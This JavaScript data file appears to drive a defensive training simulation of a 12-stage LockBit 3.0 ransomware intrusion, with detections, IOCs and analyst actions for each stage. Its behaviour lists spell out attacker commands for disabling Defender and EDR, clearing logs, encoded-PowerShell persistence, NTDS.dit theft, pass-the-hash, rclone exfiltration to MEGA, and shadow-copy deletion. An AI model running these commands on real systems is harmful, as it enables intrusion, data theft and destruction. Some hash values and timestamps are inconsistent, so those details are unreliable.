/* ================================================================
   SIM-DATA-RANSOMWARE.JS — 12-Stage Ransomware Lifecycle Scenario
   LockBit 3.0 affiliate campaign against a mid-market manufacturer
   Case IR-2025-1203 | Analyst Reconstruction from EDR + SIEM
   ================================================================ */

window.SIM_SCENARIO = {
  id:            'IR-2025-1203',
  name:          'RANSOMWARE ATTACK SIMULATION TIMELINE',
  malwareFamily: 'LOCKBIT 3.0',
  threatActor:   'LB-AFFILIATE-47',
  host:          '23 HOSTS AFFECTED',
  description:   '12-stage ransomware operator playbook — RDP initial access through double extortion, encryption, and IR containment.',

  stages: [

    /* ── STAGE 01 — INITIAL ACCESS ─────────────────────────────── */
    {
      id: 1, code: 'IAC', label: 'Initial Access',
      tactic: 'Initial Access', techniqueId: 'T1133 / T1110.001',
      techniqueName: 'External Remote Services / Brute Force',
      color: '#FF6B00', severity: 'MEDIUM', confidence: 'HIGH',
      timeOffset: 0,

      missionLog: 'LockBit affiliate identified an internet-exposed RDP endpoint (vpn-gw-01:3389) via Shodan reconnaissance. Credential stuffing attack initiated at 02:11 UTC using a breach-sourced credential list targeting service accounts. Successful authentication recorded for svc-backup@corp.internal at 02:47 UTC after 2,340 failed attempts over 36 minutes.',

      behavior: [
        'Shodan/Censys reconnaissance identified public-facing RDP on port 3389',
        '2,340 failed RDP authentication attempts over 36 minutes (T1110.001)',
        'Credential stuffing list sourced from prior breach dataset',
        'Successful logon: svc-backup@corp.internal at 02:47 UTC (Logon Type 10)',
        'RDP session established from VPN exit node: 185.220.101[.]47 (Tor exit)',
        'No MFA enforced on privileged service accounts for RDP access',
      ],
      telemetry: ['Windows Event ID 4625 (Failed Logon) — 2,340 entries', 'Windows Event ID 4624 Type 10 (Remote Interactive)', 'RDP gateway connection logs', 'Firewall inbound connection logs', 'Threat intelligence: 185.220.101[.]47 (known Tor exit node)'],
      detection: 'Spike of 2,340 EID 4625 events from single external IP within 36 minutes. Successful Logon Type 10 from a known Tor exit node following a brute-force pattern. Service account (svc-backup) authenticating interactively to a gateway — anomalous for account type.',
      iocs: ['185.220.101[.]47 (Tor exit node — source IP)', 'svc-backup@corp.internal (compromised service account)', 'EID 4625 spike: 02:11–02:47 UTC (2,340 failures)', 'EID 4624 Type 10: vpn-gw-01 at 02:47:19 UTC'],
      analystAction: 'Block 185.220.101[.]47 at perimeter firewall. Lock svc-backup account and rotate credentials. Enable account lockout policy for all service accounts. Audit all other publicly exposed RDP endpoints. Enable MFA for all privileged remote access immediately.',
      whyItMatters: 'Exposed RDP with weak credentials is the single most common LockBit initial access vector — a hardened perimeter with MFA makes this entire chain impossible.',
    },

    /* ── STAGE 02 — EXECUTION ──────────────────────────────────── */
    {
      id: 2, code: 'REXEC', label: 'Execution',
      tactic: 'Execution', techniqueId: 'T1059.001 / T1106',
      techniqueName: 'PowerShell / Native API',
      color: '#FF4500', severity: 'HIGH', confidence: 'HIGH',
      timeOffset: 2280,

      missionLog: 'Within 3 minutes of RDP authentication, the affiliate dropped a PowerShell stager to disk at C:\\ProgramData\\svcupd.ps1 at 02:50 UTC. The stager decrypted and reflectively loaded a Cobalt Strike Beacon from a base64-encoded blob, injecting into a legitimate svchost.exe process. No persistent binary remained on disk post-injection.',

      behavior: [
        'PowerShell stager written to C:\\ProgramData\\svcupd.ps1 via RDP clipboard paste',
        'PowerShell -ExecutionPolicy Bypass -File svcupd.ps1 executed from RDP session',
        'Stager decrypted embedded Cobalt Strike shellcode (AES-256 key: hardcoded)',
        'VirtualAllocEx + WriteProcessMemory + CreateRemoteThread inject into svchost.exe (PID 892)',
        'Cobalt Strike Stage 2 fetched from: update.msvc-cdn[.]net (HTTPS/443)',
        'svcupd.ps1 self-deleted after successful injection — no file artifact remains',
      ],
      telemetry: ['Sysmon EID 11 (FileCreate: svcupd.ps1)', 'Sysmon EID 1 (powershell.exe spawn from RDP session)', 'PowerShell ScriptBlock Logging (EID 4104)', 'Sysmon EID 8 (CreateRemoteThread into svchost.exe)', 'Network: HTTPS GET to update.msvc-cdn[.]net'],
      detection: 'PowerShell execution with -ExecutionPolicy Bypass spawned from explorer.exe under a freshly authenticated RDP session. CreateRemoteThread from powershell.exe targeting svchost.exe (PID 892). File creation then immediate deletion of .ps1 in ProgramData. HTTPS beacon to an uncategorized domain within 60 seconds.',
      iocs: ['C:\\ProgramData\\svcupd.ps1 (deleted post-exec — recover from MFT)', 'Sysmon EID 8: powershell.exe → svchost.exe (PID 892)', 'update.msvc-cdn[.]net (Cobalt Strike C2 staging)', 'SHA256 of stager: c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5'],
      analystAction: 'Capture memory dump of svchost.exe PID 892 before any remediation. Recover svcupd.ps1 via MFT carving — it will be in the $MFT even after deletion. Submit shellcode to sandbox. Block update.msvc-cdn[.]net at proxy and firewall immediately.',
      whyItMatters: 'Fileless injection into a legitimate svchost.exe process eliminates static AV detection entirely — behavioral EDR monitoring is the only viable detection surface at this stage.',
    },

    /* ── STAGE 03 — DEFENSE EVASION ────────────────────────────── */
    {
      id: 3, code: 'EVA', label: 'Defense Evasion',
      tactic: 'Defense Evasion', techniqueId: 'T1562.001 / T1070.001',
      techniqueName: 'Impair Defenses / Clear Logs',
      color: '#9B59B6', severity: 'HIGH', confidence: 'HIGH',
      timeOffset: 3600,

      missionLog: 'At 03:11 UTC, operator issued Cobalt Strike commands to systematically disable Windows Defender, terminate EDR agent processes, and clear Windows Security and System event logs. AMSI patching applied via reflective DLL injection to disable script-content inspection. Log clearing removed 14,847 events from Security log covering the initial access window.',

      behavior: [
        'Set-MpPreference -DisableRealtimeMonitoring $true (Defender disabled via registry)',
        'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /d 1',
        'taskkill /F /IM CrowdStrikeFalcon.exe — EDR process termination attempt',
        'taskkill /F /IM csfalconservice.exe — Falcon service termination via LOLBIN',
        'wevtutil cl Security — 14,847 Security events cleared',
        'wevtutil cl System — System log cleared covering initial period',
        'AMSI patch: amsi.dll AmsiScanBuffer function NOP-patched in memory',
      ],
      telemetry: ['Windows Event ID 1102 (Audit Log Cleared — if not cleared before)', 'EDR alert: protection disabled / process killed', 'Registry monitoring: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender', 'Sysmon EID 13 (Registry value set)', 'Sysmon EID 1: wevtutil.exe spawn chain'],
      detection: 'EID 1102 (Audit Log Cleared) is itself an indicator — even one instance warrants immediate investigation. EDR self-protection alerts on process kill attempts. Registry modification to Windows Defender policy key from non-admin GPO context. Gap in Security log entries matching intrusion window.',
      iocs: ['EID 1102: Security log cleared at 03:11 UTC by svc-backup', 'reg.exe modifying HKLM\\...\\Windows Defender\\DisableAntiSpyware', 'wevtutil.exe spawned from svchost.exe (anomalous parent)', 'EDR: CrowdStrikeFalcon.exe killed (process exit event)'],
      analystAction: 'Verify EDR agent health on vpn-gw-01 — if killed, redeploy remotely. Recover deleted log events from SIEM if forwarded before clearing. Enable log forwarding to immutable SIEM (if not already). Check adjacent hosts for same Defender disablement pattern via EDR fleet query.',
      whyItMatters: 'Defense evasion is the attacker buying time — every minute of blind operation multiplies the attacker\'s advantage and shrinks the defender\'s detection window to zero.',
    },

    /* ── STAGE 04 — PERSISTENCE ────────────────────────────────── */
    {
      id: 4, code: 'PER', label: 'Persistence',
      tactic: 'Persistence', techniqueId: 'T1053.005 / T1547.001',
      techniqueName: 'Scheduled Task / Registry Run Key',
      color: '#F39C12', severity: 'HIGH', confidence: 'HIGH',
      timeOffset: 4320,

      missionLog: 'Operator established dual persistence at 03:12 UTC. A scheduled task disguised as a Windows Certificate Maintenance task was created to survive reboots, triggering every 10 minutes and re-injecting the Cobalt Strike beacon if the C2 connection drops. A registry Run key was also written as a fallback, ensuring re-infection on next user logon.',

      behavior: [
        'schtasks /create /tn "\\Microsoft\\Windows\\CertSrv\\CertMaint" /sc MINUTE /mo 10 /tr "powershell -w hidden -e <b64blob>"',
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: "WindowsUpdate" = "powershell -w hidden -e <b64blob>"',
        'Task runs as SYSTEM using stolen svc-backup token impersonation',
        'Scheduled task XML timestamp forged to 2024-01-15 (timestomping)',
        'Both persistence mechanisms point to same Cobalt Strike stager blob',
      ],
      telemetry: ['Windows EID 4698 (Scheduled Task Created)', 'Windows EID 4702 (Scheduled Task Updated)', 'Sysmon EID 13 (RegistryEvent — Run key set)', 'Autoruns / Velociraptor persistence hunt', 'EDR: persistence artifact detection'],
      detection: 'New scheduled task under \\Microsoft\\Windows\\CertSrv\\ with PowerShell -EncodedCommand action — anomalous for certificate service namespace. Registry Run key set by svchost.exe (unexpected writer). Task creation timestamp does not match system file baseline (timestomping indicator).',
      iocs: ['Task: \\Microsoft\\Windows\\CertSrv\\CertMaint (EID 4698 03:12 UTC)', 'HKCU\\...\\Run: "WindowsUpdate" (svchost.exe writer — EID Sysmon 13)', 'PowerShell -EncodedCommand blob in task action XML', 'Task timestamp mismatch: claims 2024-01-15, NTFS MFT shows 03:12 UTC'],
      analystAction: 'Enumerate all scheduled tasks created or modified in past 24 hours. Audit HKCU and HKLM Run keys on all affected hosts. Remove both persistence mechanisms. Hunt for identical Run keys across the environment using EDR fleet query. Check for additional stager scripts in ProgramData and Temp.',
      whyItMatters: 'Without removing persistence, every remediation action is temporary — the beacon will re-establish on the next scheduled trigger regardless of what else is cleaned up.',
    },

    /* ── STAGE 05 — CREDENTIAL ACCESS ──────────────────────────── */
    {
      id: 5, code: 'CRED', label: 'Credential Access',
      tactic: 'Credential Access', techniqueId: 'T1003.001 / T1003.003',
      techniqueName: 'LSASS Memory / NTDS',
      color: '#FF1744', severity: 'CRITICAL', confidence: 'HIGH',
      timeOffset: 18000,

      missionLog: 'At 07:13 UTC, operator executed credential harvesting operations. Cobalt Strike\'s built-in Mimikatz module dumped LSASS memory in-process, recovering 7 plaintext passwords and 23 NTLM hashes including three domain administrator accounts. NTDS.dit was copied 40 minutes later from the domain controller using NTDSUtil, yielding the full Active Directory credential database.',

      behavior: [
        'Cobalt Strike sekurlsa::logonpasswords — in-memory LSASS credential dump',
        '7 plaintext passwords recovered including svc-sql, svc-deploy, and admin accounts',
        '23 NTLM hashes recovered — 3 confirmed domain administrator accounts',
        'NTDSUtil "activate instance ntds" + "ifm" to copy NTDS.dit from DC',
        'NTDS.dit (4.2 GB) + SYSTEM hive staged to C:\\Windows\\Temp\\ntd_bak\\ prior to exfil',
        'SAM database extracted via reg save HKLM\\SAM — local account hashes captured',
      ],
      telemetry: ['Sysmon EID 10 (ProcessAccess on lsass.exe)', 'Windows EID 4656 (Handle Request to lsass.exe)', 'EDR LSASS protection alert / credential access detection', 'DC: EID 4776 (Credential Validation — from vpn-gw-01)', 'NTDSUtil.exe execution telemetry on DC'],
      detection: 'Cobalt Strike in-memory Mimikatz leaves Sysmon EID 10 with SourceProcess=svchost.exe, GrantedAccess=0x1fffff on lsass.exe. NTDSUtil.exe execution on a Domain Controller is extremely rare in legitimate operations. Large NTDS.dit file written to Temp directory.',
      iocs: ['Sysmon EID 10: svchost.exe (PID 892) → lsass.exe, GrantedAccess=0x1fffff', 'NTDSUtil.exe on dc01.corp.internal at 07:53 UTC (EID 4688)', 'C:\\Windows\\Temp\\ntd_bak\\ntds.dit (4.2 GB)', 'C:\\Windows\\Temp\\ntd_bak\\SYSTEM (registry hive)'],
      analystAction: 'IMMEDIATE: Force password reset for ALL domain accounts — treat every credential as compromised. Double-rotate krbtgt account (two resets 12 hours apart). Isolate all Domain Controllers for forensic assessment. Notify security leadership — this is a domain-wide credential compromise event.',
      whyItMatters: 'NTDS.dit extraction gives the attacker every credential in the domain — offline cracking of all hashes renders the entire Active Directory infrastructure untrusted until rebuilt.',
    },

    /* ── STAGE 06 — INTERNAL RECONNAISSANCE ────────────────────── */
    {
      id: 6, code: 'RECON', label: 'Internal Recon',
      tactic: 'Discovery', techniqueId: 'T1087.002 / T1018',
      techniqueName: 'AD Account Discovery / Remote System Discovery',
      color: '#00F0FF', severity: 'HIGH', confidence: 'HIGH',
      timeOffset: 21600,

      missionLog: 'At 08:00 UTC, operator deployed BloodHound/SharpHound via Cobalt Strike to map the entire Active Directory environment. SharpHound completed full collection in 4 minutes, identifying 847 computers, 2,341 user accounts, and 23 shortest attack paths to Domain Admin. ADFind was used to enumerate backup server locations, file share paths, and high-value data repositories for targeting the exfiltration and encryption phase.',

      behavior: [
        'SharpHound.exe -c All --ZipFilename bh_collect.zip (BloodHound collection)',
        'Full AD graph: 847 computers, 2,341 users, 156 groups collected in 4 minutes',
        'BloodHound analysis: 23 paths to DA identified — shortest: 2 hops via svc-sql',
        'ADFind.exe -f "(objectCategory=computer)" > hostlist.txt',
        'net share enumeration across all 847 hosts — backup shares and NAS identified',
        'Data profiling: 2.1 TB identified across Finance, HR, and IP shares for targeting',
      ],
      telemetry: ['LDAP query volume spike on Domain Controllers (4,000+ queries in 4 min)', 'DNS: mass reverse lookups for 847 hosts', 'Sysmon EID 1: SharpHound.exe, ADFind.exe spawn from svchost.exe', 'AD audit log: LDAP queries against sensitive group memberships', 'Network flow: SMB enumeration across subnet from vpn-gw-01'],
      detection: 'LDAP query spike of 4,000+ requests to DC from single host within 4 minutes — statistically anomalous. SharpHound produces characteristic LDAP query patterns detectable by AD-aware SIEM rules. Mass SMB connection attempts to all subnet hosts within minutes.',
      iocs: ['SharpHound.exe SHA256: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3', 'ADFind.exe in C:\\ProgramData\\ (non-standard location)', 'LDAP query volume: 4,312 queries from vpn-gw-01 at 08:00–08:04 UTC', 'DNS PTR lookups: 847 sequential reverse resolutions at 08:01 UTC'],
      analystAction: 'Recover BloodHound ZIP from Cobalt Strike exfil path — it contains the complete attack roadmap. Assess all shortest paths to DA identified. Identify the 23 escalation paths and prioritize breaking them immediately. Alert on SMB enumeration patterns across all hosts.',
      whyItMatters: 'BloodHound gives the attacker a weaponized map of the entire Active Directory attack surface — they now know exactly which accounts to abuse and which hosts to target before you do.',
    },

    /* ── STAGE 07 — LATERAL MOVEMENT ───────────────────────────── */
    {
      id: 7, code: 'LATM', label: 'Lateral Movement',
      tactic: 'Lateral Movement', techniqueId: 'T1550.002 / T1021.001',
      techniqueName: 'Pass the Hash / Remote Desktop Protocol',
      color: '#FF1744', severity: 'CRITICAL', confidence: 'HIGH',
      timeOffset: 25200,

      missionLog: 'At 09:00 UTC, using harvested Domain Administrator NTLM hashes, the operator began systematic lateral movement. PsExec with Pass-the-Hash propagated Cobalt Strike to 23 hosts over 4 hours, targeting file servers, backup infrastructure, domain controllers, and workstations in all business units. By 13:00 UTC every host with domain-joined status was compromised. Affected host count: 23.',

      behavior: [
        'Impacket PsExec with DA NTLM hash: psexec.py CORP/da-account@<target> (PTH)',
        'Cobalt Strike Beacon dropped and executed on each target via SMB ADMIN$ share',
        '23 hosts compromised across 4 hours — DCs, file servers, backup agents, workstations',
        'RDP sessions opened to backup infrastructure (bk-srv-01, bk-srv-02) for direct access',
        'Domain controller dc01 and dc02 both fully compromised by 10:14 UTC',
        'Worm-like propagation: each new beacon used to enumerate and spread further',
      ],
      telemetry: ['Windows EID 4624 Type 3 (NTLM network logon) on 23 hosts', 'Windows EID 4648 (Logon with explicit credentials)', 'SMB: ADMIN$ share access from vpn-gw-01 to 23 hosts', 'New Cobalt Strike beacons from 23 hosts (new C2 sessions)', 'EDR: mass process creation events across environment'],
      detection: 'Single source host (vpn-gw-01) authenticating via NTLM to 23 different hosts within 4 hours. ADMIN$ share access pattern consistent with PsExec deployment. New Cobalt Strike C2 beacons from hosts with no prior external traffic. Domain Controllers generating EID 4648 from non-standard administrative workstations.',
      iocs: ['EID 4624 Type 3: vpn-gw-01 → 23 hosts (NTLM, DA account) at 09:00–13:00 UTC', 'SMB \\\\<target>\\ADMIN$ access from vpn-gw-01 (23 instances)', 'Cobalt Strike: 23 new beacons to update.msvc-cdn[.]net at 09:00–13:00 UTC', 'PsExec artifact: PSEXESVC.exe on 23 target hosts'],
      analystAction: 'Network-isolate all 23 compromised hosts simultaneously — do not triage one by one. Isolate in bulk via EDR fleet command or VLAN segmentation. Revoke all DA session tokens. Block PsExec and SMB lateral movement via firewall rules between internal segments. Declare P1 major incident immediately.',
      whyItMatters: 'Lateral movement at domain-admin level is the point at which a single endpoint compromise becomes a full enterprise breach — speed of detection versus spread speed is the only meaningful variable.',
    },

    /* ── STAGE 08 — DATA EXFILTRATION ──────────────────────────── */
    {
      id: 8, code: 'EXFIL', label: 'Data Exfiltration',
      tactic: 'Exfiltration', techniqueId: 'T1048 / T1567.002',
      techniqueName: 'Exfil Over Alt Protocol / Exfil to Cloud Storage',
      color: '#FF00FF', severity: 'CRITICAL', confidence: 'HIGH',
      timeOffset: 36000,

      missionLog: 'At 13:00 UTC, operator deployed rclone (renamed as svcmgr.exe) across the three primary file servers to stage and exfiltrate 847 GB of sensitive data to a MEGA cloud storage account under attacker control. Finance records, HR PII, IP documentation, and operational plans were prioritized. Exfiltration completed at 16:12 UTC — 3 hours 12 minutes of active data transfer before encryption began.',

      behavior: [
        'rclone.exe renamed to svcmgr.exe to evade process name detection (T1036)',
        'rclone sync C:\\FinanceData\\ mega:corp-bak-2025 — Finance records (412 GB)',
        'rclone sync C:\\HR\\ mega:corp-bak-2025\\ — HR/PII records (218 GB)',
        'rclone sync C:\\Engineering\\IP\\ mega:corp-bak-2025\\ — IP/designs (217 GB)',
        'Total: 847 GB exfiltrated to MEGA account backup-corp-2025@proton[.]me',
        'rclone configuration written to C:\\ProgramData\\svcmgr.conf (MEGA credentials)',
      ],
      telemetry: ['DLP: mass file read events on file servers (3 hours)', 'Network flow: 847 GB outbound to MEGA (api.mega[.]co[.]nz)', 'Proxy logs: sustained upload to api.mega.co.nz over 3+ hours', 'Sysmon EID 1: svcmgr.exe spawned from Cobalt Strike beacon', 'Endpoint: rclone configuration file written to ProgramData'],
      detection: 'Sustained 847 GB outbound transfer to api.mega.co.nz over 3 hours — anomalous data volume for any host. svcmgr.exe process with no known baseline or vendor signature. rclone.conf file in ProgramData containing cloud storage credentials. DLP alert: bulk file access pattern on financial and HR directories.',
      iocs: ['svcmgr.exe SHA256: e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6 (rclone)', 'C:\\ProgramData\\svcmgr.conf (MEGA credentials)', 'Network: 847 GB to api.mega.co.nz (13:00–16:12 UTC)', 'MEGA account: backup-corp-2025@proton[.]me'],
      analystAction: 'Block api.mega.co.nz at perimeter if not yet blocked. Preserve full PCAP of exfiltration session for evidence. Notify DPO and Legal — GDPR/regulatory breach notification obligations likely triggered. Initiate legal hold on all forensic evidence. Contact MEGA abuse team to freeze attacker account. Notify affected data subjects timeline begins now.',
      whyItMatters: 'Data exfiltration transforms this from an IT incident into a legal, regulatory, and reputational crisis — double extortion means paying the ransom does not guarantee data non-disclosure.',
    },

    /* ── STAGE 09 — INHIBIT RECOVERY ───────────────────────────── */
    {
      id: 9, code: 'VSS', label: 'Inhibit Recovery',
      tactic: 'Impact', techniqueId: 'T1490',
      techniqueName: 'Inhibit System Recovery',
      color: '#FF1744', severity: 'CRITICAL', confidence: 'HIGH',
      timeOffset: 47700,

      missionLog: 'At 16:15 UTC, operator began systematically eliminating all recovery options across 23 hosts. vssadmin delete shadows executed on every host under SYSTEM context, destroying all Volume Shadow Copies. Windows Backup service disabled. Recovery partitions unmounted and overwritten on 8 hosts. bcdedit commands modified boot configuration to prevent safe mode recovery. This is the point of no return without offsite backups.',

      behavior: [
        'vssadmin.exe delete shadows /all /quiet (executed on 23 hosts simultaneously)',
        'wbadmin delete catalog -quiet — Windows Server Backup catalog destroyed',
        'bcdedit /set {default} recoveryenabled No — recovery mode disabled',
        'bcdedit /set {default} bootstatuspolicy ignoreallfailures — errors suppressed',
        'sc config "SDRSVC" start= disabled — Windows Backup/Restore service disabled',
        'sc config "VSS" start= disabled — Volume Shadow Copy service killed',
        'net stop "Windows Backup" /y — active backup sessions terminated',
      ],
      telemetry: ['Sysmon EID 1: vssadmin.exe with delete flags on 23 hosts', 'Windows EID 4688: vssadmin.exe + bcdedit.exe + wbadmin.exe spawn', 'VSS provider logs: shadow copy deletion events', 'EDR: mass shadow copy deletion across fleet (high confidence alert)', 'SIEM: correlated detection across 23 hosts simultaneously'],
      detection: 'vssadmin delete shadows executed on multiple hosts in rapid succession — this is the clearest pre-ransomware indicator available. bcdedit recovery modification is almost exclusively observed in ransomware pre-encryption sequences. SIEM detection rule: vssadmin delete shadows on 2+ hosts within 60 minutes should trigger immediate P1 alert.',
      iocs: ['EID 4688: vssadmin.exe delete shadows /all /quiet — 23 hosts at 16:15–16:17 UTC', 'EID 4688: bcdedit.exe /set {default} recoveryenabled No — 23 hosts', 'EID 4688: wbadmin.exe delete catalog — on backup servers', 'SDRSVC service: Start type changed from Manual to Disabled'],
      analystAction: 'CRITICAL: If offsite/immutable backups exist, verify their integrity IMMEDIATELY before encryption begins. Check cloud backup snapshots. Assess recovery capability NOW — this is the last window before encryption. Alert IR leadership. Activate DR plan. Begin isolating any hosts not yet compromised.',
      whyItMatters: 'Shadow copy deletion is the point of no return — without offsite or immutable backups, the organization cannot recover without paying the ransom.',
    },

    /* ── STAGE 10 — ENCRYPTION ─────────────────────────────────── */
    {
      id: 10, code: 'ENC', label: 'Encryption',
      tactic: 'Impact', techniqueId: 'T1486',
      techniqueName: 'Data Encrypted for Impact',
      color: '#FF0000', severity: 'CRITICAL', confidence: 'HIGH',
      timeOffset: 50400,

      missionLog: 'At 17:00 UTC, LockBit 3.0 ransomware binary was deployed simultaneously across all 23 hosts via Cobalt Strike. The binary uses a hybrid RSA-2048 + AES-256 encryption scheme per file; the per-file AES key is encrypted with the operator\'s RSA public key embedded in the binary. Mass file rename events observed across all 23 hosts simultaneously — 847,293 files encrypted in 23 minutes. Ransom notes dropped in every directory. Desktop wallpaper replaced with ransom image.',

      behavior: [
        'LockBit 3.0 binary: lb3.exe (SHA256: f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7)',
        'Deployed via Cobalt Strike to all 23 hosts simultaneously at 17:00 UTC',
        'Hybrid encryption: per-file AES-256 key, RSA-2048 public key wrapping',
        'Target extensions: .docx .xlsx .pdf .pst .bak .sql .mdf .vmdk .vhd (and 300+ more)',
        'File rename: <original>.<random8chars>.lockbit3 (e.g. report.xlsx.d8f3a1c2.lockbit3)',
        '847,293 files encrypted across 23 hosts in 23 minutes (17:00–17:23 UTC)',
        'Restore-My-Files.txt ransom note dropped in every directory containing encrypted files',
        'Desktop wallpaper replaced: C:\\Windows\\Temp\\lb3_wall.bmp (LockBit 3.0 branding)',
      ],
      telemetry: ['EDR: mass file rename events — 847,293 events across 23 hosts', 'Sysmon EID 11 (FileCreate): Restore-My-Files.txt in every directory', 'SIEM: file encryption IOC rule (known LockBit 3.0 extension pattern)', 'Endpoint: lb3.exe process tree on 23 hosts', 'Windows EID 4663: mass file modification events'],
      detection: 'Mass file rename with .lockbit3 extension appended — file encryption IOC rule should fire within seconds. lb3.exe process with no established baseline. Ransom note creation: Restore-My-Files.txt appearing simultaneously across network shares. Wallpaper modification event (EID 4657 registry write). 847,293 file rename operations are unambiguous.',
      iocs: ['lb3.exe SHA256: f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7', 'File extension: .<random8chars>.lockbit3 appended to all encrypted files', 'Ransom note: Restore-My-Files.txt in every directory', 'Registry: HKCU\\Control Panel\\Desktop\\Wallpaper → C:\\Windows\\Temp\\lb3_wall.bmp'],
      analystAction: 'Initiate immediate network segmentation for any hosts not yet encrypted. Preserve lb3.exe samples for reverse engineering. Begin DR activation and recovery from immutable backups. Do not power off encrypted hosts — preserve forensic memory state. Contact specialist ransomware IR firm. Assess ransom payment — consult OFAC and legal counsel.',
      whyItMatters: 'At this stage the attack has fully succeeded from the adversary\'s perspective — every subsequent action is about recovery speed, limiting blast radius, and legal/regulatory response.',
    },

    /* ── STAGE 11 — RANSOM DEMAND ──────────────────────────────── */
    {
      id: 11, code: 'RAN', label: 'Ransom Demand',
      tactic: 'Impact', techniqueId: 'T1491',
      techniqueName: 'Defacement / Ransom Note Delivery',
      color: '#FF0000', severity: 'CRITICAL', confidence: 'HIGH',
      timeOffset: 51900,

      missionLog: 'Ransom note Restore-My-Files.txt instructs victims to access the negotiation portal at torhttps://lockbit3[.]onion using a unique victim ID. Ransom demand: $2.3M USD in Monero (XMR). Attacker applies double-extortion pressure: 847 GB of exfiltrated data listed for publication on LockBit leak site in 72 hours unless payment is confirmed. Negotiation portal shows partial file listing from exfiltrated data as proof-of-exfil.',

      behavior: [
        'Ransom note directs victim to: lockbit3[.]onion/victim/ID-829f3c1a (Tor hidden service)',
        'Unique victim decryption ID: 829f3c1a-4d7e-4b2f-9c1d-8e3f5a7b2c0d',
        'Demand: $2.3M USD, Monero (XMR) — 72-hour timer displayed on portal',
        'Proof-of-exfil: portal displays 50 sample files from exfiltrated data set',
        'Double extortion threat: data publication on LockBitSupp leak blog if no payment',
        'Negotiation chat available via portal — attacker responds within 4–8 hours',
        'Price doubles to $4.6M after 72-hour deadline; data published after 96 hours',
      ],
      telemetry: ['Endpoint: Restore-My-Files.txt content (ransom note artifact)', 'Darkweb monitoring: LockBit 3.0 leak site listing for corp.internal', 'Threat intelligence: Tor onion address attribution to LockBit 3.0 infrastructure', 'OSINT: victim mention on LockBit negotiation portal'],
      detection: 'Ransom note creation is a definitive post-encryption indicator (detection at this stage is too late for prevention). Tor access attempts to .onion addresses from internal hosts should be blocked and alerted. Darkweb monitoring services may detect victim listing on LockBit leak site before public disclosure.',
      iocs: ['Ransom note: Restore-My-Files.txt (SHA256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0)', 'Tor portal: lockbit3[.]onion/victim/ID-829f3c1a', 'Victim ID: 829f3c1a-4d7e-4b2f-9c1d-8e3f5a7b2c0d', 'Monero wallet: 48edfV8... (payment address from ransom note)'],
      analystAction: 'Do NOT pay ransom without legal and OFAC counsel — LockBit may be a sanctioned entity. Engage specialist ransomware negotiators if considering engagement. Preserve all ransom note copies as evidence. Notify law enforcement (FBI, CISA). Submit IOCs to IC3. Activate media/comms response plan. Begin recovery from backups in parallel.',
      whyItMatters: 'Double extortion means decryption is not the only concern — the exfiltrated data creates an independent data breach event with separate regulatory notification obligations regardless of recovery outcome.',
    },

    /* ── STAGE 12 — CONTAINMENT & IR ───────────────────────────── */
    {
      id: 12, code: 'CTN', label: 'Containment / IR',
      tactic: 'Incident Response', techniqueId: null,
      techniqueName: 'Analyst Response / IR Playbook',
      color: '#00FF41', severity: 'RESOLVED', confidence: 'HIGH',
      timeOffset: 57600,

      missionLog: 'IR team achieved full containment at 17:00 UTC + 2 hours. All 23 hosts isolated via VLAN quarantine. Cobalt Strike C2 infrastructure sinkholed. Domain rebuilt on clean DCs with new krbtgt keys. Recovery initiated from cloud-backup snapshots (pre-infection state confirmed). Attacker eviction completed by 22:00 UTC. Total attacker dwell time: 14 hours 37 minutes. Recovery ETA: 11 days for full environment rebuild.',

      behavior: [
        'VLAN quarantine applied to all 23 affected hosts simultaneously via network team',
        'Cobalt Strike C2 (update.msvc-cdn[.]net) sinkholed at perimeter — all beacons dead',
        'Domain Admin accounts disabled; krbtgt rotated twice (12-hour separation)',
        'Clean DC pair built from gold image; SYSVOL restored from pre-incident snapshot',
        'Recovery from Azure Backup snapshots (T-36 hours pre-infection confirmed clean)',
        'Forensic images captured for all 23 hosts under chain-of-custody before rebuild',
        'YARA hunt across rebuilt environment — zero residual LockBit artifacts found',
        'Law enforcement notification: FBI IC3, CISA — sharing IOC package',
      ],
      telemetry: ['SIEM: all Cobalt Strike beacons ceased at 17:02 UTC post-sinkhole', 'EDR: isolation events for 23 hosts recorded with timestamps', 'AD audit: krbtgt rotation events logged on clean DC', 'Azure Backup: snapshot restoration records (chain-of-custody)', 'IR platform: YARA scan results — 0 detections on rebuilt infrastructure'],
      detection: 'Post-containment: no new C2 beacons observed after sinkhole. No lateral movement events after VLAN isolation. Attacker retry attempts at 17:08 UTC using invalidated NTLM hashes — blocked at new DC perimeter. Zero residual malware on rebuilt endpoints confirmed by YARA sweep.',
      iocs: ['C2 sinkholed: update.msvc-cdn[.]net → 0.0.0.0 at 17:02 UTC', 'All 23 hosts: EDR isolation confirmed by 17:04 UTC', 'krbtgt rotation: dc01-new.corp.internal at 19:14 UTC and 07:14 UTC (next day)', 'LockBit lb3.exe YARA rule: LOCKBIT3_PAYLOAD — 0 detections on clean fleet'],
      analystAction: 'Complete forensic imaging. Author detailed incident timeline for legal and regulatory submissions. Conduct root-cause analysis: implement MFA on all RDP/VPN, enforce account lockout, deploy immutable backup solution, enable LSASS protection, add detection rules for vssadmin + bcdedit. Schedule post-incident review within 5 business days with executive leadership.',
      whyItMatters: 'Speed of containment is the single most impactful variable in ransomware IR — every hour of dwell time after encryption broadens attacker leverage and narrows recovery options.',
    },

  ],
};
